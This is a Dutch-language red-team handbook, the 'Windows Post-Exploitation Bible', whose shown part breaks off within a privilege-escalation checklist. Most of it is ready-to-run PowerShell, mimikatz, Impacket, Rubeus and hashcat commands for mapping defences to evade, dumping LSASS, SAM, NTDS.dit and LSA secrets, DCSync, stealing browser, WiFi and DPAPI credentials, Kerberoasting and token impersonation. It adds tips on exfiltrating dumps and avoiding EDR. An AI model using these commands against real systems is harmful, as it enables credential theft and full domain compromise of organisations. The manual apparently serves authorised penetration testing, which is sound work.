# XPOSE SECURITY â€” WINDOWS POST-EXPLOITATION BIBLE
## Van Foothold naar Volledige Domein Compromis

**Classificatie:** STRIKT VERTROUWELIJK â€” SENIOR OPERATOR LEVEL  
**Versie:** 1.0 | Januari 2026

---

# INHOUDSOPGAVE

1. [Post-Exploitation Fundamentals](#1-post-exploitation-fundamentals)
2. [Situational Awareness](#2-situational-awareness)
3. [Credential Access â€” Complete Guide](#3-credential-access--complete-guide)
4. [Privilege Escalation â€” All Techniques](#4-privilege-escalation--all-techniques)
5. [Persistence â€” 30+ Techniques](#5-persistence--30-techniques)
6. [Lateral Movement â€” Complete Arsenal](#6-lateral-movement--complete-arsenal)
7. [Defense Evasion Fundamentals](#7-defense-evasion-fundamentals)
8. [Active Directory Domination](#8-active-directory-domination)
9. [Post-Exploitation Checklist](#9-post-exploitation-checklist)

---

# 1. POST-EXPLOITATION FUNDAMENTALS

## 1.1 The Post-Exploitation Mindset

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    POST-EXPLOITATION PHASES                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  FOOTHOLD          SITUATIONAL        PRIVILEGE         PERSISTENCE        â”‚
â”‚  OBTAINED    â”€â”€â”€â–º  AWARENESS    â”€â”€â”€â–º  ESCALATION  â”€â”€â”€â–º  ESTABLISHED        â”‚
â”‚                                                                             â”‚
â”‚      â”‚                  â”‚                  â”‚                  â”‚            â”‚
â”‚      â–¼                  â–¼                  â–¼                  â–¼            â”‚
â”‚  â€¢ Stable shell    â€¢ Who am I?       â€¢ Local admin     â€¢ Survive reboot   â”‚
â”‚  â€¢ Basic enum      â€¢ Where am I?     â€¢ SYSTEM          â€¢ Multiple methods â”‚
â”‚  â€¢ AV check        â€¢ What's here?    â€¢ Domain creds    â€¢ Redundancy       â”‚
â”‚                    â€¢ Defenses?                                             â”‚
â”‚                                                                             â”‚
â”‚      CREDENTIAL         LATERAL           DOMAIN            OBJECTIVES     â”‚
â”‚      ACCESS       â”€â”€â”€â–º  MOVEMENT    â”€â”€â”€â–º  DOMINANCE   â”€â”€â”€â–º  ACHIEVED      â”‚
â”‚                                                                             â”‚
â”‚      â”‚                  â”‚                  â”‚                  â”‚            â”‚
â”‚      â–¼                  â–¼                  â–¼                  â–¼            â”‚
â”‚  â€¢ Dump creds      â€¢ Spread access   â€¢ DA/EA           â€¢ Data access      â”‚
â”‚  â€¢ Kerberos        â€¢ Multiple hosts  â€¢ DCSync          â€¢ Exfiltration     â”‚
â”‚  â€¢ Tokens          â€¢ Pivot networks  â€¢ Golden ticket   â€¢ Impact demo      â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

> **ðŸ“˜ SENIOR INSIGHT:**
> Post-exploitation is waar red team werk echt begint. Initial access is slechts de deur.
> Een senior operator:
> - Neemt de tijd voor reconnaissance
> - Begrijpt de omgeving voordat hij beweegt
> - Heeft meerdere persistence mechanismen
> - Denkt altijd aan OPSEC en detection

---

## 1.2 Initial Triage â€” First 5 Minutes

```powershell
# === IMMEDIATE TRIAGE ===
# Run this FIRST after getting a shell

# 1. WHO AM I?
whoami /all
# Geeft: username, groups, privileges, SIDs

# 2. WHERE AM I?
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"
# Geeft: OS version, architecture, domain membership

# 3. WHAT SECURITY?
# Check AV/EDR
wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState
Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled
tasklist /v | findstr -i "defender crowd sentinel carbon"
sc query windefend

# 4. AM I ADMIN?
net localgroup administrators
whoami /groups | findstr "S-1-5-32-544"
# S-1-5-32-544 = Local Administrators group

# 5. NETWORK POSITION
ipconfig /all
route print
arp -a
netstat -ano | findstr ESTABLISHED
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **De eerste 5 minuten bepalen je succes.**
> - Maak GEEN lawaai voordat je weet welke defenses actief zijn
> - Als EDR aanwezig is: pas je aanpak aan
> - Document alles voor je rapport

---

# 2. SITUATIONAL AWARENESS

## 2.1 System Enumeration

```powershell
# === COMPLETE SYSTEM ENUMERATION ===

# Operating System Details
systeminfo
[System.Environment]::OSVersion
Get-WmiObject Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture

# Installed Software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize

# Running Processes with Owners
Get-Process -IncludeUserName | Select-Object ProcessName,Id,UserName,Path | Format-Table -AutoSize
# Of in CMD:
tasklist /v

# Services
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name,DisplayName,StartType
sc query state= all

# Scheduled Tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName,TaskPath,State

# Environment Variables (vaak secrets!)
Get-ChildItem Env: | Format-Table -AutoSize
# Let op: vaak API keys, credentials, paths

# Drives & Shares
Get-PSDrive -PSProvider FileSystem
net share
wmic logicaldisk get caption,description,providername
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **Wat je zoekt:**
> - Security software (AV, EDR, DLP)
> - Backup software (vaak hoge privileges)
> - Admin tools (vaak cached credentials)
> - Development tools (source code, secrets)
> - Database clients (connection strings)

---

## 2.2 User & Domain Enumeration

```powershell
# === USER ENUMERATION ===

# Current User Complete Info
whoami /all
# Geeft: User, Groups, Privileges, Logon ID

# Local Users
net user
Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet

# Local Groups
net localgroup
net localgroup administrators
Get-LocalGroupMember -Group "Administrators"
Get-LocalGroupMember -Group "Remote Desktop Users"

# Domain Info (if domain joined)
systeminfo | findstr /B "Domain"
nltest /dclist:
nltest /domain_trusts

# Domain Users (requires domain user)
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain

# Currently Logged-in Users
query user
qwinsta
Get-WmiObject Win32_LoggedOnUser | Select-Object Antecedent -Unique

# Recent Logins (Event Log)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 50 | 
    Select-Object TimeCreated,@{N='User';E={$_.Properties[5].Value}} | Format-Table -AutoSize
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **High-value targets:**
> - Domain Admins en Enterprise Admins
> - Service accounts (vaak overprivileged)
> - IT staff accounts (vaak op meerdere systemen admin)
> - Accounts met "admin", "svc", "sql", "backup" in naam

---

## 2.3 Network Enumeration

```powershell
# === NETWORK ENUMERATION ===

# Network Configuration
ipconfig /all
Get-NetIPConfiguration
Get-NetAdapter | Select-Object Name,Status,MacAddress,LinkSpeed

# DNS Configuration
Get-DnsClientServerAddress
ipconfig /displaydns | Select-String "Record Name" -Context 0,1

# Routing
route print
Get-NetRoute | Select-Object DestinationPrefix,NextHop,InterfaceAlias

# ARP Table (nearby hosts)
arp -a
Get-NetNeighbor | Where-Object {$_.State -eq "Reachable"}

# Active Connections
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | 
    Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess

# Listening Ports
netstat -ano | findstr LISTENING
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# Firewall Status
netsh advfirewall show allprofiles state
Get-NetFirewallProfile | Select-Object Name,Enabled

# SMB Shares Accessible
net view \\localhost
net view /domain
Get-SmbShare

# Network Discovery
# Ping sweep (careful - noisy!)
1..254 | ForEach-Object { Test-Connection -ComputerName "10.10.10.$_" -Count 1 -Quiet -ErrorAction SilentlyContinue | 
    Where-Object {$_} | ForEach-Object { "10.10.10.$_" } }
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **Network enum reveals:**
> - Andere netwerken om te pivoten
> - Kritieke servers (DC, SQL, file servers)
> - Segmentatie gaps
> - Outbound connectivity voor exfil

---

## 2.4 Security Software Detection

```powershell
# === COMPREHENSIVE SECURITY DETECTION ===

# Method 1: Process Names
$securityProcesses = @(
    # Microsoft
    "MsMpEng", "MsSense", "SenseIR", "SenseCncProxy", "SecurityHealthService",
    # CrowdStrike
    "CSFalconService", "CSFalconContainer", "csagent", "falconctl",
    # SentinelOne
    "SentinelAgent", "SentinelServiceHost", "SentinelStaticEngine", "sentinelagent",
    # Carbon Black
    "cb", "CbDefense", "CbDefenseSensor", "RepMgr", "RepWsc", "CbOsxSensorService",
    # Cylance
    "CylanceSvc", "CylanceUI",
    # Sophos
    "SophosAgent", "SophosUI", "SAVService", "SEDService",
    # Symantec/Broadcom
    "ccSvcHst", "rtvscan", "SMC", "SepMasterService",
    # McAfee/Trellix
    "McAfeeFramework", "mfefire", "mfemms", "mfevtp",
    # Kaspersky
    "avp", "avpui", "klnagent",
    # Trend Micro
    "Ntrtscan", "tmproxy", "TmListen", "TmPfw",
    # ESET
    "ekrn", "egui",
    # Panda
    "PSANHost", "PSUAService",
    # Webroot
    "WRSA", "WRCoreService",
    # Malwarebytes
    "MBAMService", "mbamgui",
    # Elastic
    "elastic-agent", "elastic-endpoint",
    # Wazuh
    "wazuh-agent"
)

Get-Process | Where-Object { $securityProcesses -contains $_.ProcessName } | 
    Select-Object ProcessName,Id,Path | Format-Table -AutoSize

# Method 2: Services
Get-Service | Where-Object { 
    $_.DisplayName -match "defender|sentinel|crowd|carbon|cylance|sophos|symantec|mcafee|kasper|trend|eset|malware|elastic|wazuh" 
} | Select-Object Name,DisplayName,Status

# Method 3: Installed Programs
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Where-Object { $_.DisplayName -match "defender|sentinel|crowd|carbon|cylance|sophos|symantec|mcafee|kasper|trend|eset|malware|elastic" } |
    Select-Object DisplayName,Publisher

# Method 4: WMI Security Center (Consumer AV only)
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | 
    Select-Object displayName,productState

# Method 5: Specific EDR Directories
$edrPaths = @(
    "C:\Program Files\CrowdStrike",
    "C:\Program Files\SentinelOne",
    "C:\Program Files\Carbon Black",
    "C:\Program Files\Cylance",
    "C:\Program Files\Elastic",
    "C:\Program Files\Windows Defender Advanced Threat Protection"
)
$edrPaths | ForEach-Object { if (Test-Path $_) { "FOUND: $_" } }

# Method 6: Defender Status
Get-MpComputerStatus | Select-Object *Enabled,*Running,*SignatureLastUpdated
Get-MpPreference | Select-Object DisableRealtimeMonitoring,DisableBehaviorMonitoring,ExclusionPath

# Method 7: Sysmon Detection
Get-Service sysmon* -ErrorAction SilentlyContinue
fltmc | findstr -i "sysmon"
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **Na detectie van security software:**
>
> | Software | Implicatie | Aanpak |
> |----------|------------|--------|
> | Windows Defender | Basis AV | AMSI bypass, exclusions |
> | Defender ATP/MDE | Advanced | Careful, veel telemetry |
> | CrowdStrike | Zeer geavanceerd | Assume compromise possible |
> | SentinelOne | Kernel-level | Direct syscalls nodig |
> | Carbon Black | Behavior-based | Living-off-the-land |
> | Sysmon | Logging only | Evasion technieken nodig |

---

# 3. CREDENTIAL ACCESS â€” COMPLETE GUIDE

## 3.1 Credential Locations Overview

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    WINDOWS CREDENTIAL STORAGE                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  MEMORY (Live)                         DISK (Persistent)                    â”‚
â”‚  â”œâ”€â”€ LSASS.exe                         â”œâ”€â”€ SAM Database                     â”‚
â”‚  â”‚   â”œâ”€â”€ NTLM Hashes                   â”‚   â””â”€â”€ Local account hashes         â”‚
â”‚  â”‚   â”œâ”€â”€ Kerberos Tickets              â”œâ”€â”€ NTDS.dit (Domain Controller)     â”‚
â”‚  â”‚   â”œâ”€â”€ Plaintext (WDigest)           â”‚   â””â”€â”€ All domain hashes            â”‚
â”‚  â”‚   â”œâ”€â”€ Cached Credentials            â”œâ”€â”€ SECURITY Hive                    â”‚
â”‚  â”‚   â””â”€â”€ DPAPI Keys                    â”‚   â””â”€â”€ LSA Secrets                  â”‚
â”‚  â””â”€â”€ Browser Memory                    â”œâ”€â”€ Credential Manager               â”‚
â”‚                                        â”‚   â””â”€â”€ %LOCALAPPDATA%\Microsoft\    â”‚
â”‚  REGISTRY                              â”‚       Credentials\                 â”‚
â”‚  â”œâ”€â”€ SAM Hive                          â”œâ”€â”€ Browser Storage                  â”‚
â”‚  â”œâ”€â”€ SECURITY Hive                     â”‚   â”œâ”€â”€ Chrome: Login Data (SQLite)  â”‚
â”‚  â”œâ”€â”€ SYSTEM Hive (Boot Key)            â”‚   â”œâ”€â”€ Firefox: logins.json         â”‚
â”‚  â””â”€â”€ Cached Domain Creds               â”‚   â””â”€â”€ Edge: Login Data             â”‚
â”‚                                        â”œâ”€â”€ WiFi Passwords                   â”‚
â”‚  ACTIVE DIRECTORY                      â”‚   â””â”€â”€ netsh wlan export            â”‚
â”‚  â”œâ”€â”€ Kerberoastable SPNs               â”œâ”€â”€ Saved RDP Credentials            â”‚
â”‚  â”œâ”€â”€ AS-REP Roastable                  â””â”€â”€ Application Configs              â”‚
â”‚  â”œâ”€â”€ Group Policy Preferences              â””â”€â”€ web.config, appsettings.json â”‚
â”‚  â””â”€â”€ LAPS Passwords                                                         â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 3.2 LSASS Credential Dumping

### Method 1: Mimikatz (Classic)

```powershell
# Requires: Local Admin + SeDebugPrivilege

# Interactive Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords    # Dump all credentials
sekurlsa::wdigest           # WDigest plaintext (if enabled)
sekurlsa::kerberos          # Kerberos tickets
sekurlsa::credman           # Credential Manager
sekurlsa::dpapi             # DPAPI masterkeys

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump to file
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt
```

> **ðŸ“˜ SENIOR INSIGHT:**
> Mimikatz is heavily signatured. Gebruik alternatieven in moderne omgevingen.

---

### Method 2: comsvcs.dll MiniDump (LOLBIN)

```powershell
# Living-off-the-Land: Uses built-in Windows DLL
# Requires: Local Admin

# Find LSASS PID
$lsassPid = (Get-Process lsass).Id

# Method A: rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full

# Method B: PowerShell with comsvcs
$sig = @"
[DllImport("C:\\Windows\\System32\\comsvcs.dll", EntryPoint="MiniDumpW")]
public static extern bool MiniDump(uint pid, string path, uint type);
"@
Add-Type -MemberDefinition $sig -Name "Dbghelp" -Namespace "Win32"
[Win32.Dbghelp]::MiniDump((Get-Process lsass).Id, "C:\temp\lsass.dmp", 2)

# Exfil dump, analyze offline with:
# mimikatz: sekurlsa::minidump lsass.dmp
#           sekurlsa::logonpasswords
```

> **ðŸ“˜ SENIOR INSIGHT:**
> comsvcs.dll MiniDump:
> - Geen extra tools nodig
> - Minder gedetecteerd dan mimikatz
> - MAAR: Defender ATP detecteert dit nu ook
> - TIP: Rename dump file, compress, exfil

---

### Method 3: Task Manager Dump (GUI)

```
1. Open Task Manager als Administrator
2. Details tab
3. Rechtermuisklik op lsass.exe
4. "Create dump file"
5. Dump wordt opgeslagen in %TEMP%
6. Analyze offline met Mimikatz
```

> **ðŸ“˜ SENIOR INSIGHT:**
> Werkt alleen met GUI access (RDP).
> Wordt vaak over het hoofd gezien door blue teams.

---

### Method 4: ProcDump (Sysinternals)

```powershell
# ProcDump is een legitieme Microsoft tool
# Download van Sysinternals of al aanwezig

procdump.exe -ma lsass.exe lsass.dmp
procdump64.exe -ma lsass.exe lsass.dmp -accepteula

# Met -r flag voor less detection
procdump.exe -r -ma lsass.exe lsass.dmp
```

---

### Method 5: Direct Syscalls (OPSEC-safe)

```csharp
// NanoDump approach - direct syscalls to avoid hooks
// Dit vereist custom tooling

// Concept:
// 1. Open LSASS handle via NtOpenProcess (direct syscall)
// 2. MiniDumpWriteDump via direct syscall
// 3. Encrypt/compress dump in memory
// 4. Write to disk of exfil direct

// Tools die dit doen:
// - NanoDump
// - HandleKatz
// - MalSeclogon
```

---

### Method 6: Credential Guard Bypass

```powershell
# Check if Credential Guard is enabled
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | 
    Select-Object SecurityServicesRunning

# If Credential Guard is ON:
# - LSASS credentials zijn protected
# - NTLM hashes niet beschikbaar
# - Kerberos tickets wel (soms)

# Bypass opties:
# 1. Downgrade attack (disable via GPO als je DA hebt)
# 2. Token impersonation (geen creds nodig)
# 3. Kerberos-only attacks
# 4. DCSync (als je de rechten hebt)
```

---

## 3.3 SAM Database Extraction

```powershell
# === SAM DATABASE DUMPING ===
# Contains local account NTLM hashes

# Method 1: Registry Save (Requires Admin)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security

# Offline extraction met secretsdump.py:
# secretsdump.py -sam sam -system system -security security LOCAL

# Method 2: Volume Shadow Copy
# Create shadow copy
vssadmin create shadow /for=C:

# Copy from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\security

# Method 3: Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Method 4: CrackMapExec (remote)
crackmapexec smb TARGET -u USER -p PASS --sam
```

> **ðŸ“˜ SENIOR INSIGHT:**
> SAM bevat alleen LOCAL accounts.
> Domain accounts staan in NTDS.dit op de DC.

---

## 3.4 NTDS.dit Extraction (Domain Controller)

```powershell
# === NTDS.DIT DUMPING ===
# Contains ALL domain account hashes
# ONLY on Domain Controllers

# Method 1: ntdsutil (Built-in)
# Create IFM (Install From Media) backup
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" quit quit

# Files created:
# C:\temp\ntds\Active Directory\ntds.dit
# C:\temp\ntds\registry\SYSTEM
# C:\temp\ntds\registry\SECURITY

# Method 2: Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\security

# Method 3: DCSync (No file access needed!)
# Requires: Replication rights (DA, EA, DC)
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit

# Specifieke user:
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:administrator" exit

# Met secretsdump.py (Impacket):
secretsdump.py corp.local/admin:password@dc01.corp.local -just-dc-ntlm

# Offline extraction:
secretsdump.py -ntds ntds.dit -system system -security security LOCAL
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **DCSync is de cleanste methode:**
> - Geen bestanden nodig op DC
> - Gebruikt native replication protocol
> - Moeilijker te detecteren
> - Vereist: DS-Replication-Get-Changes en DS-Replication-Get-Changes-All

---

## 3.5 LSA Secrets

```powershell
# === LSA SECRETS ===
# Contains: Service account passwords, auto-logon creds, VPN passwords

# Method 1: Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# Method 2: Impacket secretsdump
secretsdump.py DOMAIN/user:pass@target -just-dc-user -user-status

# Method 3: Registry + Offline
reg save HKLM\SECURITY C:\temp\security
reg save HKLM\SYSTEM C:\temp\system
# secretsdump.py -security security -system system LOCAL

# What you'll find:
# - $MACHINE.ACC: Computer account password
# - DefaultPassword: Auto-logon password
# - NL$KM: Cached credential encryption key
# - Service account passwords
# - DPAPI system keys
```

---

## 3.6 Cached Domain Credentials

```powershell
# === CACHED CREDENTIALS (DCC2/mscash2) ===
# Windows caches domain creds for offline logon
# Default: Last 10 logons cached

# Check cache count
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount

# Method 1: Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"

# Method 2: Impacket (from SAM/SECURITY/SYSTEM)
secretsdump.py -sam sam -security security -system system LOCAL

# Output format: $DCC2$10240#username#hash
# Crack with hashcat:
hashcat -m 2100 dcc2_hashes.txt wordlist.txt
```

> **ðŸ“˜ SENIOR INSIGHT:**
> DCC2 hashes zijn TRAAG om te cracken.
> Maar als je physical access hebt of de workstation kan dumpen,
> kun je wachtwoorden recoveren van domain users die ooit inlogden.

---

## 3.7 Browser Credentials

```powershell
# === BROWSER CREDENTIAL EXTRACTION ===

# Chrome Credentials
# Location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Encrypted with DPAPI

# Method 1: SharpChrome
SharpChrome.exe logins /browser:chrome

# Method 2: LaZagne
lazagne.exe browsers

# Method 3: Manual Chrome (Python)
# Chrome uses DPAPI with user's encryption key
# Requires user context or DPAPI key

# Firefox Credentials
# Location: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json
# Encrypted with NSS library, key4.db

# Edge (Chromium)
# Same as Chrome, different path
# %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# Extract all with LaZagne:
lazagne.exe all
```

---

## 3.8 WiFi Passwords

```powershell
# === WIFI PASSWORD EXTRACTION ===

# List saved WiFi profiles
netsh wlan show profiles

# Show password for specific profile
netsh wlan show profile name="WIFI_NAME" key=clear

# Export all WiFi passwords
(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $profile = ($_ -split ":")[1].Trim()
    $password = (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content").ToString()
    "$profile : $password"
}

# Export WiFi profiles to XML (includes password)
netsh wlan export profile folder=C:\temp key=clear
```

---

## 3.9 DPAPI Secrets

```powershell
# === DPAPI SECRETS ===
# Data Protection API - Windows credential encryption

# DPAPI Master Keys Location:
# %APPDATA%\Microsoft\Protect\{SID}\
# %LOCALAPPDATA%\Microsoft\Protect\

# Mimikatz DPAPI Extraction
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"

# Decrypt specific blob with masterkey
mimikatz.exe "dpapi::blob /in:blob.bin /masterkey:KEY" exit

# Dump Credential Manager with DPAPI
mimikatz.exe "privilege::debug" "sekurlsa::credman" "exit"

# SharpDPAPI - More comprehensive
SharpDPAPI.exe triage
SharpDPAPI.exe masterkeys
SharpDPAPI.exe credentials
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **DPAPI is de sleutel tot veel secrets:**
> - Browser passwords
> - Credential Manager
> - Saved RDP credentials
> - Certificate private keys
> - Azure/O365 tokens
>
> Als je DPAPI masterkeys hebt, kun je bijna alles decrypten.

---

## 3.10 Kerberos Attacks

```powershell
# === KERBEROASTING ===
# Extract service account TGS tickets for offline cracking

# Method 1: Rubeus
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Method 2: Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.10 -outputfile kerberoast.txt

# Method 3: PowerView
Import-Module PowerView.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File kerberoast.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# === AS-REP ROASTING ===
# Target accounts without Kerberos pre-authentication

# Method 1: Rubeus
Rubeus.exe asreproast /outfile:asrep.txt

# Method 2: Impacket
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt

# Method 3: PowerView
Get-DomainUser -PreauthNotRequired | Get-ASREPHash

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 3.11 Token Manipulation

```powershell
# === TOKEN IMPERSONATION ===
# Abuse access tokens without knowing passwords

# List available tokens
mimikatz.exe "privilege::debug" "token::list" "exit"

# Impersonate specific user
mimikatz.exe "privilege::debug" "token::elevate /user:DOMAIN\Administrator" "exit"

# Incognito (Meterpreter)
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# With Rubeus (S4U)
Rubeus.exe s4u /user:machine$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc.corp.local /ptt
```

> **ðŸ“˜ SENIOR INSIGHT:**
> **Token impersonation is powerful:**
> - Geen wachtwoord nodig
> - Werkt ook met Credential Guard
> - Check altijd welke tokens beschikbaar zijn
> - Service accounts hebben vaak interessante tokens

---

# 4. PRIVILEGE ESCALATION â€” ALL TECHNIQUES

## 4.1 Privilege Escalation Methodology

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    PRIVILEGE ESCALATION CHECKLIST                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  QUICK WINS                           CONFIGURATION ISSUES                  â”‚
â”‚  â˜ Unquoted service paths             â˜ AlwaysInstallElevated               â”‚
â”‚  â˜ Weak service permissions           â˜ Stored credentials                  â”‚
â”‚  â˜ DLL hijacking                      â˜ AutoLogon credentials               â”‚
â”‚  â˜ Scheduled tasks                    â˜ Unattend.xml files                  â”‚
â”‚                                                                             â”‚
â”‚  EXPLOITATION                         TOKEN/IMPERSONATION                   â”‚
â”‚  â˜ Missing patches (kernel)           â˜ SeImpersonatePrivilege              â”‚
â”‚  â˜ Vulnerable software                â˜ SeAssignPrimaryTokenPrivilege       â”‚
â”‚  â˜ Print Spooler (PrintNightmare)     â˜ Token impersonation                 â”‚
â”‚                                                                             â”‚
â”‚  CREDENTIAL REUSE                     ACTIVE DIRECTORY                      â”‚
â”‚  â˜ Password in files                  â˜ GPP passwords                       â”‚
â”‚  â˜ Registry stored creds              â˜ Kerberos delegation                 â”‚
